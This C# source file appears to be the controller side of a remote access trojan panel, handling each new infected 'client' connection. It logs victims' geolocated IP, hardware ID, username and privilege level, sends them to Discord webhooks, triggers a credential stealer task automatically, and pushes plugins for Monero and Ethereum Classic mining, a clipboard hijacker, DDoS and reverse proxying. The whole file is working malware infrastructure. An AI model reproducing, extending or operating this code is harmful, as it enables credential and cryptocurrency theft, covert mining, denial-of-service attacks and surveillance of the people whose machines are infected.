using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Windows.Forms;
using cGeoIp;
using Leb128;
using Server.Connectings;
using Server.Helper;
using Server.Helper.Tasks;

namespace Server.Messages;

internal class HandlerConnect
{
	public static cGeoMain cGeoMain = new cGeoMain();

	public static void Read(Clients client, object[] objects)
	{
		DataGridViewRow RowClient = new DataGridViewRow();
		RowClient.Tag = client;
		RowClient.Height = Program.form.HeightColumn();
		client.Tag = RowClient;
		client.Hwid = (string)objects[3];
		client.UserMachine = (string)objects[4];
		using (MemoryStream stream = new MemoryStream((byte[])objects[1]))
		{
			RowClient.Cells.Add(new DataGridViewImageCell
			{
				Value = new Bitmap(stream),
				ImageLayout = DataGridViewImageCellLayout.Stretch
			});
		}
		RowClient.Cells.Add(new DataGridViewTextBoxCell
		{
			Value = client.IP
		});
		string text = "";
		string text2 = "";
		try
		{
			string[] array = cGeoMain.GetIpInf(client.IP).Split(':');
			RowClient.Cells.Add(new DataGridViewTextBoxCell
			{
				Value = array[1]
			});
			text = array[1];
			text2 = array[2];
		}
		catch
		{
			RowClient.Cells.Add(new DataGridViewTextBoxCell
			{
				Value = "Unknown"
			});
		}
		RowClient.Cells.Add(new DataGridViewTextBoxCell
		{
			Value = (string)objects[2]
		});
		RowClient.Cells.Add(new DataGridViewTextBoxCell
		{
			Value = (File.Exists("Users\\" + objects[3]?.ToString() + "\\Note.txt") ? File.ReadAllText("Users\\" + objects[3]?.ToString() + "\\Note.txt") : "")
		});
		RowClient.Cells.Add(new DataGridViewTextBoxCell
		{
			Value = (string)objects[3]
		});
		RowClient.Cells.Add(new DataGridViewTextBoxCell
		{
			Value = (string)objects[4]
		});
		RowClient.Cells.Add(new DataGridViewTextBoxCell
		{
			Value = (string)objects[5]
		});
		RowClient.Cells.Add(new DataGridViewTextBoxCell
		{
			Value = (string)objects[6]
		});
		RowClient.Cells.Add(new DataGridViewTextBoxCell
		{
			Value = (string)objects[7]
		});
		RowClient.Cells.Add(new DataGridViewTextBoxCell
		{
			Value = (string)objects[8]
		});
		RowClient.Cells.Add(new DataGridViewTextBoxCell
		{
			Value = (string)objects[9]
		});
		RowClient.Cells.Add(new DataGridViewTextBoxCell
		{
			Value = (string)objects[10]
		});
		RowClient.Cells.Add(new DataGridViewTextBoxCell
		{
			Value = (string)objects[11]
		});
		RowClient.Cells.Add(new DataGridViewTextBoxCell
		{
			Value = (string)objects[12]
		});
		RowClient.Cells.Add(new DataGridViewTextBoxCell
		{
			Value = "0"
		});
		RowClient.Cells.Add(new DataGridViewTextBoxCell
		{
			Value = (string)objects[13]
		});
		Program.form.GridClients.Invoke((MethodInvoker)delegate
		{
			Program.form.GridClients.Rows.Add(RowClient);
		});
		if (!Directory.Exists("Users\\" + (string)objects[3] + "\\Recovery"))
		{
			AutoTaskMgr.Stealer(client);
		}
		AutoTaskMgr.RunTasks(client);
		if (Directory.Exists("Users\\" + (string)objects[3]))
		{
			Methods.AppendLogs("Client " + client.IP + " " + client.UserMachine + " " + client.Hwid, "Connect", Color.Green);
			if (Program.form.settings.WebHookConnect && !string.IsNullOrEmpty(Program.form.settings.WebHook))
			{
				string mssgBody = "---------------------------------\r\nConnect new :comet: \r\n**IP: **                      " + client.IP + "\r\n**Group:**               " + (string)objects[2] + "\r\n**Country:**           " + text + " :flag_" + text2.ToLower() + ": \r\n**Username:**        " + (string)objects[4] + "\r\n**Hwid:**                 " + (string)objects[3] + "\r\n**Windows:**         " + (string)objects[8] + "\r\n**Time Install:**    " + (string)objects[11] + "\r\n**Privilege:**          " + (string)objects[12] + "\r\n**Window:**           " + (string)objects[13];
				string[] array2 = Program.form.settings.WebHook.Split(',');
				foreach (string webhook in array2)
				{
					DiscordWebhook.Send(mssgBody, "Log U_U Log", webhook);
				}
			}
		}
		else
		{
			Methods.AppendLogs("Client " + client.IP + " " + client.UserMachine + " " + client.Hwid, "New Connect", Color.Green);
			Directory.CreateDirectory("Users\\" + (string)objects[3]);
			if (Program.form.settings.WebHookNewConnect && !string.IsNullOrEmpty(Program.form.settings.WebHook))
			{
				string mssgBody2 = "---------------------------------\r\nConnect :comet: \r\n**IP: **                      " + client.IP + "\r\n**Group:**               " + (string)objects[2] + "\r\n**Country:**           " + text + " :flag_" + text2.ToLower() + ": \r\n**Username:**        " + (string)objects[4] + "\r\n**Hwid:**                 " + (string)objects[3] + "\r\n**Windows:**         " + (string)objects[8] + "\r\n**Time Install:**    " + (string)objects[11] + "\r\n**Privilege:**          " + (string)objects[12] + "\r\n**Window:**           " + (string)objects[13];
				string[] array2 = Program.form.settings.WebHook.Split(',');
				foreach (string webhook2 in array2)
				{
					DiscordWebhook.Send(mssgBody2, "Log U_U Log", webhook2);
				}
			}
		}
		List<string> list = new List<string>();
		foreach (DataGridViewCell cell in RowClient.Cells)
		{
			if (cell.Value is string)
			{
				list.Add(cell.OwningColumn.Name.Replace("Column", "") + ": " + (string)cell.Value);
			}
		}
		File.WriteAllText("Users\\" + (string)objects[3] + "\\Information.txt", string.Join("\n", (IEnumerable<string>)list.ToArray()));
		if (Environment.UserName + " @ " + Environment.MachineName != (string)objects[4])
		{
			client.Send(new object[3]
			{
				"Invoke",
				"leb",
				new byte[1]
			});
		}
		if (Program.form.MinerXMR.work)
		{
			string checksum = Methods.GetChecksum("Plugin\\MinerXMR.dll");
			client.Send(new object[3]
			{
				"Invoke",
				checksum,
				new byte[1]
			});
		}
		if (Program.form.MinerEtc.work)
		{
			string checksum2 = Methods.GetChecksum("Plugin\\MinerEtc.dll");
			client.Send(new object[3]
			{
				"Invoke",
				checksum2,
				new byte[1]
			});
		}
		if (Program.form.Clipper.work)
		{
			string checksum3 = Methods.GetChecksum("Plugin\\Clipper.dll");
			client.Send(new object[3]
			{
				"Invoke",
				checksum3,
				new byte[1]
			});
		}
		if (Program.form.DDos.work)
		{
			string checksum4 = Methods.GetChecksum("Plugin\\DDos.dll");
			client.Send(new object[3]
			{
				"Invoke",
				checksum4,
				new byte[1]
			});
		}
		if (Program.form.ReverseProxyR.work)
		{
			byte[] array3 = LEB128.Write(new object[2] { "Pack", "ReverseProxyR" });
			string checksum5 = Methods.GetChecksum("Plugin\\ReverseProxy.dll");
			client.Send(new object[3] { "Invoke", checksum5, array3 });
		}
		if (Program.form.ReverseProxyU.work)
		{
			byte[] array4 = LEB128.Write(new object[2] { "Pack", "ReverseProxyU" });
			string checksum6 = Methods.GetChecksum("Plugin\\ReverseProxy.dll");
			client.Send(new object[3] { "Invoke", checksum6, array4 });
		}
	}
}
